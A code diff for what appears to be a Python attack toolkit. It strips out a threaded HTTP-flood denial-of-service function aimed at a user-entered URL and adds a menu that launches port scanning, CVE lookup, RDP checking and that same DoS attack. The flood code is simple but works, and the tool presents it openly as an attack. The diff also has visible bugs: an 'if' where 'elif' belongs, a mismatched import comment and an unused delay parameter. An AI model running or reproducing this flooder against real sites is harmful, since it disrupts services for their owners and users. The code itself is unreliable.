@@ -1,33 +1,50 @@
-import requests
-import threading
-import time
+import os
+from utils.banner import print_banner  # Make sure filename is banners.py
 
-def send_request(url, delay):
-    try:
-        response = requests.get(url)
-        print(f"[+] Sent request to {url}, Status: {response.status_code}")
-    except Exception as e:
-        print(f"[!] Error: {e}")
+def main_menu():
+    while True:
+        os.system("clear")  # Guna 'cls' kalau Windows
+        print_banner()
+        print("Select option:")
+        print("1. Port Scanning")
+        print("2. Service Version & CVE")
+        print("3. RDP Checking")
+        print("4. DoS Attack")
+        print("5. Exit\n")
 
-def dos_attack():
-    target_url = input("Enter the target URL for DoS attack (e.g. http://example.com): ")
-    request_count = int(input("Enter the number of requests to send: "))
-    delay = float(input("Enter delay between requests (in seconds): "))
+        choice = input("Insert Input: ")
 
-    print(f"\n[+] Starting DoS Attack on {target_url}...")
-    print(f"[+] Sending {request_count} requests with {delay}s delay between each request.\n")
+        if choice == '1':
+            from scanner.portscanner import run_port_scan
 
-    threads = []
-    for _ in range(request_count):
-        t = threading.Thread(target=send_request, args=(target_url, delay))
-        threads.append(t)
-        t.start()
+            target = input("Enter target IP address: ")
+            print("\n1. Scan common ports [1]")
+            print("2. Scan full range [2]")
+            scan_type = input("Choose [1] or [2]: ")
+            full_scan = scan_type == "2"
 
-    # Wait for all threads to finish
-    for t in threads:
-        t.join()
+            run_port_scan(target, full_scan)
 
-    print(f"\n[✓] DoS Attack completed on {target_url}.")
+        elif choice == '2':
+            from scanner.versioncve import run_version_cve_check
+            run_version_cve_check()
+
+        elif choice == '3':
+            from scanner.rdpchecker import run_rdp_check
+            run_rdp_check()
+
+        if choice == '4':
+            from scanner.injtester import dos_attack
+            dos_attack()
+            
+        elif choice == '5':
+            print("\n[!] Exiting... Goodbye!")
+            break
+
+        else:
+            print("\n[!] Invalid Option, please try again!")
+
+        input("\nPress Enter to return to main menu...")
 
 if __name__ == "__main__":
-    dos_attack()
+    main_menu()
